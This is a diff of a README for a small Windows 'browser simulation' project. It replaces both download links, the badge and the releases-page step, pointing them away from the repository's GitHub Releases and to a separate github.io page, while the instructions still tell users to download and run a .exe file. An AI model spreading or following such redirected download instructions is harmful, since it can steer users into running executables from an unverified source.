@@ -1,6 +1,6 @@
 # 🌐 Web_Browser_Simulation_DSA - Simple Tool For Visualizing Browser Logic
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Thameem787/Web_Browser_Simulation_DSA/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://thameem787.github.io)
 
 ## 📖 About This Project
 
@@ -16,7 +16,7 @@ You need a computer running Windows 10 or Windows 11 to use this simulation. The
 
 Follow these steps to set up the simulation on your computer:
 
-1. Visit the [releases page](https://github.com/Thameem787/Web_Browser_Simulation_DSA/releases).
+1. Visit the [releases page](https://thameem787.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Click the file ending in .exe to start your download.
 4. Locate the file in your Downloads folder once the transfer finishes.
